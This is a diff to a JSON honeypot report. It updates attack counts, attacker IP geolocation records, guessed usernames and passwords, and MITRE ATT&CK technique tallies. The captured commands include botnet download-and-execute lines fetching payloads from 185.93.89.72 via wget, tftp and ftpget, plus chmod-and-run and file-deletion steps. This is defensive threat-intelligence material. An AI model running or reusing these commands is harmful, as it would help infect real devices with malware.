@@ -1,9 +1,9 @@
 {
   "schema_version": "4.0",
-  "generated_at": "2026-09-03T06:04:11Z",
+  "generated_at": "2026-09-03T07:01:46Z",
   "window": {
     "start": "2026-09-03T00:00:00Z",
-    "end": "2026-09-03T06:03:31Z"
+    "end": "2026-09-03T07:00:59Z"
   },
   "sensor": {
     "name": "greyfield-honeypot",
@@ -25,22 +25,15 @@
     }
   },
   "summary": {
-    "sessions": 986,
-    "unique_sources": 79,
-    "auth_attempts": 1440,
-    "accepted_logins": 520,
-    "commands": 1653,
-    "downloads": 17,
+    "sessions": 1038,
+    "unique_sources": 88,
+    "auth_attempts": 1480,
+    "accepted_logins": 523,
+    "commands": 1698,
+    "downloads": 19,
     "attack_techniques": 9
   },
   "hourly": [
-    {
-      "bucket": "2026-08-27T07:00:00Z",
-      "sessions": 0,
-      "auth": 0,
-      "commands": 0,
-      "downloads": 0
-    },
     {
       "bucket": "2026-08-27T08:00:00Z",
       "sessions": 0,
@@ -1205,8 +1198,15 @@
     },
     {
       "bucket": "2026-09-03T06:00:00Z",
-      "sessions": 4,
-      "auth": 3,
+      "sessions": 55,
+      "auth": 42,
+      "commands": 45,
+      "downloads": 2
+    },
+    {
+      "bucket": "2026-09-03T07:00:00Z",
+      "sessions": 1,
+      "auth": 1,
       "commands": 0,
       "downloads": 0
     }
@@ -1214,11 +1214,11 @@
   "protocols": [
     {
       "value": "TELNET",
-      "count": 568
+      "count": 577
     },
     {
       "value": "SSH",
-      "count": 418
+      "count": 461
     }
   ],
   "sources": [
@@ -1274,8 +1274,8 @@
       "asn": 18206,
       "organization": "TM ONE Cloud Alpha Edge",
       "flag": "\ud83c\uddf2\ud83c\uddfe",
-      "sessions": 113,
-      "auth_attempts": 103,
+      "sessions": 131,
+      "auth_attempts": 117,
       "accepted": 0,
       "commands": 0,
       "downloads": 0,
@@ -1283,7 +1283,7 @@
         "SSH"
       ],
       "first_seen": "2026-09-03T00:00:00Z",
-      "last_seen": "2026-09-03T06:03:31Z"
+      "last_seen": "2026-09-03T07:00:59Z"
     },
     {
       "ip": "77.239.124.178",
@@ -1316,8 +1316,8 @@
       "asn": 17426,
       "organization": "PRIMENET GLOBAL LTD.",
       "flag": "\ud83c\uddee\ud83c\uddf3",
-      "sessions": 76,
-      "auth_attempts": 76,
+      "sessions": 88,
+      "auth_attempts": 88,
       "accepted": 0,
       "commands": 0,
       "downloads": 0,
@@ -1325,7 +1325,7 @@
         "SSH"
       ],
       "first_seen": "2026-09-03T00:00:47Z",
-      "last_seen": "2026-09-03T06:01:53Z"
+      "last_seen": "2026-09-03T06:59:34Z"
     },
     {
       "ip": "80.94.92.55",
@@ -1347,6 +1347,27 @@
       ],
       "first_seen": "2026-09-03T01:54:28Z",
       "last_seen": "2026-09-03T02:49:13Z"
+    },
+    {
+      "ip": "185.93.89.72",
+      "country": "Netherlands",
+      "country_code": "NL",
+      "city": "Kerkrade",
+      "latitude": 50.8658,
+      "longitude": 6.0625,
+      "asn": 213790,
+      "organization": "Atis Omran Sevin PSJ",
+      "flag": "\ud83c\uddf3\ud83c\uddf1",
+      "sessions": 3,
+      "auth_attempts": 6,
+      "accepted": 3,
+      "commands": 42,
+      "downloads": 3,
+      "protocols": [
+        "TELNET"
+      ],
+      "first_seen": "2026-09-03T02:13:36Z",
+      "last_seen": "2026-09-03T06:55:22Z"
     },
     {
       "ip": "116.110.211.230",
@@ -1391,6 +1412,27 @@
       "last_seen": "2026-09-03T04:42:14Z"
     },
     {
+      "ip": "46.201.24.161",
+      "country": "Ukraine",
+      "country_code": "UA",
+      "city": "Dnipro",
+      "latitude": 48.4644,
+      "longitude": 35.0462,
+      "asn": 6849,
+      "organization": "NCC2011125583 Approved IP assignment",
+      "flag": "\ud83c\uddfa\ud83c\udde6",
+      "sessions": 2,
+      "auth_attempts": 2,
+      "accepted": 1,
+      "commands": 31,
+      "downloads": 1,
+      "protocols": [
+        "TELNET"
+      ],
+      "first_seen": "2026-09-03T06:55:06Z",
+      "last_seen": "2026-09-03T06:55:59Z"
+    },
+    {
       "ip": "103.114.247.23",
       "country": "India",
       "country_code": "IN",
@@ -1433,25 +1475,25 @@
       "last_seen": "2026-09-03T02:14:19Z"
     },
     {
-      "ip": "185.93.89.72",
-      "country": "Netherlands",
-      "country_code": "NL",
-      "city": "Kerkrade",
-      "latitude": 50.8658,
-      "longitude": 6.0625,
-      "asn": 213790,
-      "organization": "Atis Omran Sevin PSJ",
-      "flag": "\ud83c\uddf3\ud83c\uddf1",
-      "sessions": 2,
-      "auth_attempts": 4,
-      "accepted": 2,
-      "commands": 28,
-      "downloads": 2,
+      "ip": "2.57.121.112",
+      "country": "Romania",
+      "country_code": "RO",
+      "city": "Bucharest",
+      "latitude": 44.4268,
+      "longitude": 26.1025,
+      "asn": 47890,
+      "organization": "UNMANAGED LTD",
+      "flag": "\ud83c\uddf7\ud83c\uddf4",
+      "sessions": 5,
+      "auth_attempts": 25,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
       "protocols": [
-        "TELNET"
+        "SSH"
       ],
-      "first_seen": "2026-09-03T02:13:36Z",
-      "last_seen": "2026-09-03T03:10:42Z"
+      "first_seen": "2026-09-03T01:04:34Z",
+      "last_seen": "2026-09-03T06:49:08Z"
     },
     {
       "ip": "211.53.113.224",
@@ -1475,7 +1517,7 @@
       "last_seen": "2026-09-03T02:07:56Z"
     },
     {
-      "ip": "2.57.121.112",
+      "ip": "193.46.255.86",
       "country": "Romania",
       "country_code": "RO",
       "city": "Bucharest",
@@ -1484,16 +1526,16 @@
       "asn": 47890,
       "organization": "UNMANAGED LTD",
       "flag": "\ud83c\uddf7\ud83c\uddf4",
-      "sessions": 4,
-      "auth_attempts": 20,
+      "sessions": 6,
+      "auth_attempts": 18,
       "accepted": 0,
       "commands": 0,
       "downloads": 0,
       "protocols": [
         "SSH"
       ],
-      "first_seen": "2026-09-03T01:04:34Z",
-      "last_seen": "2026-09-03T05:23:36Z"
+      "first_seen": "2026-09-03T00:23:02Z",
+      "last_seen": "2026-09-03T06:25:27Z"
     },
     {
       "ip": "116.110.16.246",
@@ -1557,27 +1599,6 @@
       ],
       "first_seen": "2026-09-03T00:00:56Z",
       "last_seen": "2026-09-03T00:02:02Z"
-    },
-    {
-      "ip": "193.46.255.86",
-      "country": "Romania",
-      "country_code": "RO",
-      "city": "Bucharest",
-      "latitude": 44.4268,
-      "longitude": 26.1025,
-      "asn": 47890,
-      "organization": "UNMANAGED LTD",
-      "flag": "\ud83c\uddf7\ud83c\uddf4",
-      "sessions": 5,
-      "auth_attempts": 15,
-      "accepted": 0,
-      "commands": 0,
-      "downloads": 0,
-      "protocols": [
-        "SSH"
-      ],
-      "first_seen": "2026-09-03T00:23:02Z",
-      "last_seen": "2026-09-03T05:19:58Z"
     },
     {
       "ip": "34.76.25.90",
@@ -1662,6 +1683,49 @@
       ],
       "first_seen": "2026-09-03T04:35:15Z",
       "last_seen": "2026-09-03T04:35:52Z"
+    },
+    {
+      "ip": "160.177.83.241",
+      "country": "Morocco",
+      "country_code": "MA",
+      "city": "Marrakesh",
+      "latitude": 31.6225,
+      "longitude": -7.9898,
+      "asn": 36903,
+      "organization": "African Network Information Center",
+      "flag": "\ud83c\uddf2\ud83c\udde6",
+      "sessions": 2,
+      "auth_attempts": 2,
+      "accepted": 1,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "TELNET"
+      ],
+      "first_seen": "2026-09-03T06:29:12Z",
+      "last_seen": "2026-09-03T06:29:32Z"
+    },
+    {
+      "ip": "143.44.196.14",
+      "country": "Philippines",
+      "country_code": "PH",
+      "city": "Iloilo",
+      "latitude": 10.9522,
+      "longitude": 122.5799,
+      "asn": 17639,
+      "organization": "Converge ICT Iloilo Network",
+      "flag": "\ud83c\uddf5\ud83c\udded",
+      "sessions": 4,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH",
+        "TELNET"
+      ],
+      "first_seen": "2026-09-03T06:07:51Z",
+      "last_seen": "2026-09-03T06:08:01Z"
     },
     {
       "ip": "176.227.245.107",
@@ -1874,6 +1938,28 @@
       "last_seen": "2026-09-03T00:42:30Z"
     },
     {
+      "ip": "171.4.232.82",
+      "country": "Thailand",
+      "country_code": "TH",
+      "city": "San Pa Tong",
+      "latitude": 18.6244,
+      "longitude": 98.8954,
+      "asn": 45758,
+      "organization": "Triple T Broadband Public Company Limited",
+      "flag": "\ud83c\uddf9\ud83c\udded",
+      "sessions": 3,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH",
+        "TELNET"
+      ],
+      "first_seen": "2026-09-03T06:32:53Z",
+      "last_seen": "2026-09-03T06:33:23Z"
+    },
+    {
       "ip": "172.236.228.222",
       "country": "United States",
       "country_code": "US",
@@ -1936,6 +2022,69 @@
       ],
       "first_seen": "2026-09-03T01:22:57Z",
       "last_seen": "2026-09-03T01:23:03Z"
+    },
+    {
+      "ip": "195.87.198.206",
+      "country": "T\u00fcrkiye",
+      "country_code": "TR",
+      "city": "Adana",
+      "latitude": 36.9864,
+      "longitude": 35.3253,
+      "asn": 15924,
+      "organization": "Vodafone Net Iletisim Hizmetler AS",
+      "flag": "\ud83c\uddf9\ud83c\uddf7",
+      "sessions": 2,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH"
+      ],
+      "first_seen": "2026-09-03T06:50:52Z",
+      "last_seen": "2026-09-03T06:50:54Z"
+    },
+    {
+      "ip": "20.29.43.153",
+      "country": "United States",
+      "country_code": "US",
+      "city": "Des Moines",
+      "latitude": 41.6006,
+      "longitude": -93.6091,
+      "asn": 8075,
+      "organization": "Microsoft Corporation",
+      "flag": "\ud83c\uddfa\ud83c\uddf8",
+      "sessions": 2,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH"
+      ],
+      "first_seen": "2026-09-03T06:45:21Z",
+      "last_seen": "2026-09-03T06:45:22Z"
+    },
+    {
+      "ip": "77.90.185.16",
+      "country": "Germany",
+      "country_code": "DE",
+      "city": "Augsburg",
+      "latitude": 48.3646,
+      "longitude": 10.9049,
+      "asn": 213790,
+      "organization": "Limited Network LTD",
+      "flag": "\ud83c\udde9\ud83c\uddea",
+      "sessions": 2,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH"
+      ],
+      "first_seen": "2026-09-03T03:45:48Z",
+      "last_seen": "2026-09-03T06:04:44Z"
     },
     {
       "ip": "45.156.128.96",
@@ -2211,6 +2360,69 @@
       ],
       "first_seen": "2026-09-03T00:49:39Z",
       "last_seen": "2026-09-03T00:51:46Z"
+    },
+    {
+      "ip": "190.112.102.158",
+      "country": "Argentina",
+      "country_code": "AR",
+      "city": "Milagro",
+      "latitude": -31.0083,
+      "longitude": -65.9911,
+      "asn": 28048,
+      "organization": "Internet Para Todos - Gobierno de La Rioja",
+      "flag": "\ud83c\udde6\ud83c\uddf7",
+      "sessions": 1,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH"
+      ],
+      "first_seen": "2026-09-03T06:41:59Z",
+      "last_seen": "2026-09-03T06:41:59Z"
+    },
+    {
+      "ip": "64.62.197.167",
+      "country": "United States",
+      "country_code": "US",
+      "city": "Livermore-Pleasanton",
+      "latitude": 37.6968,
+      "longitude": -121.8443,
+      "asn": 6939,
+      "organization": "Hurricane Electric LLC",
+      "flag": "\ud83c\uddfa\ud83c\uddf8",
+      "sessions": 1,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "TELNET"
+      ],
+      "first_seen": "2026-09-03T06:40:20Z",
+      "last_seen": "2026-09-03T06:40:22Z"
+    },
+    {
+      "ip": "54.146.217.235",
+      "country": "United States",
+      "country_code": "US",
+      "city": "Washington",
+      "latitude": 38.8951,
+      "longitude": -77.0364,
+      "asn": 14618,
+      "organization": "Amazon Data Services Northern Virginia",
+      "flag": "\ud83c\uddfa\ud83c\uddf8",
+      "sessions": 1,
+      "auth_attempts": 0,
+      "accepted": 0,
+      "commands": 0,
+      "downloads": 0,
+      "protocols": [
+        "SSH"
+      ],
+      "first_seen": "2026-09-03T06:29:28Z",
+      "last_seen": "2026-09-03T06:29:29Z"
     },
     {
       "ip": "37.10.113.213",
@@ -2591,27 +2803,6 @@
       "last_seen": "2026-09-03T04:06:54Z"
     },
     {
-      "ip": "77.90.185.16",
-      "country": "Germany",
-      "country_code": "DE",
-      "city": "Augsburg",
-      "latitude": 48.3646,
-      "longitude": 10.9049,
-      "asn": 213790,
-      "organization": "Limited Network LTD",
-      "flag": "\ud83c\udde9\ud83c\uddea",
-      "sessions": 1,
-      "auth_attempts": 0,
-      "accepted": 0,
-      "commands": 0,
-      "downloads": 0,
-      "protocols": [
-        "SSH"
-      ],
-      "first_seen": "2026-09-03T03:45:48Z",
-      "last_seen": "2026-09-03T03:45:48Z"
-    },
-    {
       "ip": "45.156.128.186",
       "country": "Netherlands",
       "country_code": "NL",
@@ -2889,7 +3080,7 @@
     "usernames": [
       {
         "value": "root",
-        "count": 653
+        "count": 683
       },
       {
         "value": "enable\\x00",
@@ -2897,7 +3088,7 @@
       },
       {
         "value": "admin",
-        "count": 121
+        "count": 125
       },
       {
         "value": "support",
@@ -2936,6 +3127,10 @@
         "count": 5
       },
       {
+        "value": "khari",
+        "count": 5
+      },
+      {
         "value": "ftp",
         "count": 4
       },
@@ -2945,6 +3140,10 @@
       },
       {
         "value": "deploy",
+        "count": 3
+      },
+      {
+        "value": "enable",
         "count": 3
       },
       {
@@ -2973,10 +3172,6 @@
       },
       {
         "value": "chinadsl-net",
-        "count": 2
-      },
-      {
-        "value": "enable",
         "count": 2
       },
       {
@@ -3279,7 +3474,7 @@
       },
       {
         "value": "admin",
-        "count": 60
+        "count": 61
       },
       {
         "value": "123456",
@@ -3291,7 +3486,7 @@
       },
       {
         "value": "root",
-        "count": 36
+        "count": 38
       },
       {
         "value": "password",
@@ -3366,11 +3561,11 @@
         "count": 8
       },
       {
-        "value": "7ujMko0vizxv",
-        "count": 6
+        "value": "system",
+        "count": 7
       },
       {
-        "value": "system",
+        "value": "7ujMko0vizxv",
         "count": 6
       },
       {
@@ -3434,6 +3629,10 @@
         "count": 3
       },
       {
+        "value": "5up",
+        "count": 3
+      },
+      {
         "value": "Aa123456@",
         "count": 2
       },
@@ -3443,6 +3642,10 @@
       },
       {
         "value": "Aa112233",
+        "count": 2
+      },
+      {
+        "value": "Admin123",
         "count": 2
       },
       {
@@ -3478,11 +3681,15 @@
         "count": 2
       },
       {
-        "value": "5up",
+        "value": "Passw0rd",
         "count": 2
       },
       {
-        "value": "Passw0rd",
+        "value": "P@ssw0rd",
+        "count": 2
+      },
+      {
+        "value": "Aa12345678",
         "count": 2
       },
       {
@@ -3759,10 +3966,6 @@
       },
       {
         "value": "debian",
-        "count": 1
-      },
-      {
-        "value": "Admin123",
         "count": 1
       },
       {
@@ -4264,21 +4467,13 @@
       {
         "value": "Via: SIP/2.0/TCP nm;branch=foo",
         "count": 1
-      },
-      {
-        "value": "To: <sip:nm2@nm2>",
-        "count": 1
-      },
-      {
-        "value": "CSeq: 42 OPTIONS",
-        "count": 1
       }
     ]
   },
   "commands": [
     {
       "command": "shell",
-      "count": 503,
+      "count": 505,
       "families": [
         "Other shell activity"
       ],
@@ -4289,7 +4484,7 @@
     },
     {
       "command": "sh",
-      "count": 503,
+      "count": 505,
       "families": [
         "Shell execution"
       ],
@@ -4300,7 +4495,18 @@
     },
     {
       "command": "system",
-      "count": 501,
+      "count": 502,
+      "families": [
+        "Other shell activity"
+      ],
+      "techniques": [
+        "T1059.004"
+      ],
+      "truncated": false
+    },
+    {
+      "command": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      "count": 16,
       "families": [
         "Other shell activity"
       ],
@@ -4321,19 +4527,8 @@
       "truncated": false
     },
     {
-      "command": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      "count": 8,
-      "families": [
-        "Other shell activity"
-      ],
-      "techniques": [
-        "T1059.004"
-      ],
-      "truncated": false
-    },
-    {
       "command": "ping ;sh",
-      "count": 7,
+      "count": 9,
       "families": [
         "Shell execution"
       ],
@@ -4344,18 +4539,7 @@
     },
     {
       "command": "echo -e \"\\x47\\x41\\x59\"",
-      "count": 6,
-      "families": [
-        "Other shell activity"
-      ],
-      "techniques": [
-        "T1059.004"
-      ],
-      "truncated": false
-    },
-    {
-      "command": "enable",
-      "count": 5,
+      "count": 9,
       "families": [
         "Other shell activity"
       ],
@@ -4366,7 +4550,18 @@
     },
     {
       "command": "linuxshell",
-      "count": 5,
+      "count": 7,
+      "families": [
+        "Other shell activity"
+      ],
+      "techniques": [
+        "T1059.004"
+      ],
+      "truncated": false
+    },
+    {
+      "command": "enable",
+      "count": 6,
       "families": [
         "Other shell activity"
       ],
@@ -4377,12 +4572,45 @@
     },
     {
       "command": "enablelinuxshell",
+      "count": 6,
+      "families": [
+        "Other shell activity"
+      ],
+      "techniques": [
+        "T1059.004"
+      ],
+      "truncated": false
+    },
+    {
+      "command": "rm /dev/.t; rm /dev/.sh; rm /dev/.human",
+      "count": 4,
+      "families": [
+        "File deletion"
+      ],
+      "techniques": [
+        "T1070.004"
+      ],
+      "truncated": false
+    },
+    {
+      "command": "cd /dev/",
       "count": 4,
       "families": [
         "Other shell activity"
       ],
       "techniques": [
         "T1059.004"
+      ],
+      "truncated": false
+    },
+    {
+      "command": "cd /proc && cat self/cmdline",
+      "count": 4,
+      "families": [
+        "File discovery"
+      ],
+      "techniques": [
+        "T1083"
       ],
       "truncated": false
     },
@@ -4398,41 +4626,8 @@
       "truncated": false
     },
     {
-      "command": "rm /dev/.t; rm /dev/.sh; rm /dev/.human",
-      "count": 3,
-      "families": [
-        "File deletion"
-      ],
-      "techniques": [
-        "T1070.004"
-      ],
-      "truncated": false
-    },
-    {
-      "command": "cd /dev/",
-      "count": 3,
-      "families": [
-        "Other shell activity"
-      ],
-      "techniques": [
-        "T1059.004"
-      ],
-      "truncated": false
-    },
-    {
-      "command": "cd /proc && cat self/cmdline",
-      "count": 3,
-      "families": [
-        "File discovery"
-      ],
-      "techniques": [
-        "T1083"
-      ],
-      "truncated": false
-    },
-    {
       "command": ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4443,7 +4638,7 @@
     },
     {
       "command": ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4454,7 +4649,7 @@
     },
     {
       "command": ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4465,7 +4660,7 @@
     },
     {
       "command": ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4476,7 +4671,7 @@
     },
     {
       "command": ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4487,7 +4682,7 @@
     },
     {
       "command": ">/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4498,7 +4693,7 @@
     },
     {
       "command": ">/data/d && chmod 777 /data/d && /data/d && cd /data/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4509,7 +4704,7 @@
     },
     {
       "command": ">/etc/d && chmod 777 /etc/d && /etc/d && cd /etc/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4520,7 +4715,7 @@
     },
     {
       "command": ">/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4531,7 +4726,7 @@
     },
     {
       "command": ">/usr/d && chmod 777 /usr/d && /usr/d && cd /usr/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4542,7 +4737,7 @@
     },
     {
       "command": ">/home/d && chmod 777 /home/d && /home/d && cd /home/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4553,7 +4748,7 @@
     },
     {
       "command": ">/root/d && chmod 777 /root/d && /root/d && cd /root/",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4564,7 +4759,7 @@
     },
     {
       "command": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-      "count": 2,
+      "count": 3,
       "families": [
         "Payload transfer",
         "Permission change",
@@ -4579,7 +4774,7 @@
     },
     {
       "command": "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
-      "count": 2,
+      "count": 3,
       "families": [
         "File discovery"
       ],
@@ -4590,7 +4785,7 @@
     },
     {
       "command": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon",
-      "count": 2,
+      "count": 3,
       "families": [
         "File discovery",
         "File deletion"
@@ -4603,7 +4798,7 @@
     },
     {
       "command": "cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e \"\\x47\\x41\\x59\"",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change"
       ],
@@ -4614,7 +4809,7 @@
     },
     {
       "command": "cat /bin/echo",
-      "count": 2,
+      "count": 3,
       "families": [
         "File discovery"
       ],
@@ -4625,7 +4820,7 @@
     },
     {
       "command": "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-      "count": 2,
+      "count": 3,
       "families": [
         "Payload transfer",
         "Permission change",
@@ -4640,7 +4835,7 @@
     },
     {
       "command": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-      "count": 2,
+      "count": 3,
       "families": [
         "Permission change",
         "File deletion"
@@ -5263,9 +5458,9 @@
     {
       "url": "http://185.93.89.72/wget",
       "sha256": "a6296a79f44e21b76604d2d2bbf795d2cf380f70e39d45fbf166707ff3b4a6a4",
-      "count": 2,
+      "count": 3,
       "first_seen": "2026-09-03T02:13:38Z",
-      "last_seen": "2026-09-03T03:10:35Z",
+      "last_seen": "2026-09-03T06:55:18Z",
       "techniques": [
         "T1105"
       ],
@@ -5310,9 +5505,9 @@
     {
       "url": null,
       "sha256": "4af5a5c98ad132095c6fbe7b02c242153a190a01cc321e50a916a0ca46fbaa62",
-      "count": 2,
+      "count": 3,
       "first_seen": "2026-09-03T02:13:43Z",
-      "last_seen": "2026-09-03T03:10:42Z",
+      "last_seen": "2026-09-03T06:55:22Z",
       "techniques": [
         "T1105"
       ],
@@ -5436,21 +5631,26 @@
       "id": "T1059.004",
       "name": "Unix Shell",
       "tactic": "Execution",
-      "count": 1588,
+      "count": 1612,
       "evidence": [
         {
           "value": "shell",
-          "count": 503,
+          "count": 505,
           "truncated": false
         },
         {
           "value": "sh",
-          "count": 503,
+          "count": 505,
           "truncated": false
         },
         {
           "value": "system",
-          "count": 501,
+          "count": 502,
+          "truncated": false
+        },
+        {
+          "value": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+          "count": 16,
           "truncated": false
         },
         {
@@ -5459,42 +5659,37 @@
           "truncated": false
         },
         {
-          "value": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-          "count": 8,
-          "truncated": false
-        },
-        {
           "value": "ping ;sh",
-          "count": 7,
+          "count": 9,
           "truncated": false
         },
         {
           "value": "echo -e \"\\x47\\x41\\x59\"",
-          "count": 6,
-          "truncated": false
-        },
-        {
-          "value": "enable",
-          "count": 5,
+          "count": 9,
           "truncated": false
         },
         {
           "value": "linuxshell",
-          "count": 5,
+          "count": 7,
+          "truncated": false
+        },
+        {
+          "value": "enable",
+          "count": 6,
           "truncated": false
         },
         {
           "value": "enablelinuxshell",
+          "count": 6,
+          "truncated": false
+        },
+        {
+          "value": "cd /dev/",
           "count": 4,
           "truncated": false
         },
         {
           "value": "/bin/busybox 9xnIgnAv",
-          "count": 3,
-          "truncated": false
-        },
-        {
-          "value": "cd /dev/",
           "count": 3,
           "truncated": false
         },
@@ -5571,7 +5766,7 @@
       "id": "T1110.001",
       "name": "Password Guessing",
       "tactic": "Credential Access",
-      "count": 1040,
+      "count": 1050,
       "evidence": [
         {
           "value": "enable\\x00 / linuxshell\\x00",
@@ -5590,7 +5785,7 @@
         },
         {
           "value": "root / root",
-          "count": 29,
+          "count": 30,
           "truncated": false
         },
         {
@@ -5699,93 +5894,93 @@
           "truncated": false
         }
       ],
-      "evidence_observed": 85,
+      "evidence_observed": 93,
       "evidence_published": 25
     },
     {
       "id": "T1222.002",
       "name": "Linux and Mac Permissions",
       "tactic": "Defense Impairment",
-      "count": 34,
+      "count": 50,
       "evidence": [
         {
           "value": ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/data/d && chmod 777 /data/d && /data/d && cd /data/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/etc/d && chmod 777 /etc/d && /etc/d && cd /etc/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/usr/d && chmod 777 /usr/d && /usr/d && cd /usr/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/home/d && chmod 777 /home/d && /home/d && cd /home/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": ">/root/d && chmod 777 /root/d && /root/d && cd /root/",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e \"\\x47\\x41\\x59\"",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
@@ -5806,26 +6001,26 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 24,
+      "count": 28,
       "evidence": [
         {
           "value": "Malformed transfer reference withheld",
-          "count": 15,
+          "count": 16,
           "truncated": false
         },
         {
           "value": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "http://185.93.89.72/wget",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
@@ -5851,26 +6046,26 @@
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 25,
       "evidence": [
         {
           "value": "cd /proc && cat self/cmdline",
-          "count": 3,
+          "count": 4,
           "truncated": false
         },
         {
           "value": "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "cat /bin/echo",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
@@ -5936,31 +6131,31 @@
       "id": "T1070.004",
       "name": "File Deletion",
       "tactic": "Stealth",
-      "count": 18,
+      "count": 23,
       "evidence": [
         {
           "value": "rm /dev/.t; rm /dev/.sh; rm /dev/.human",
-          "count": 3,
+          "count": 4,
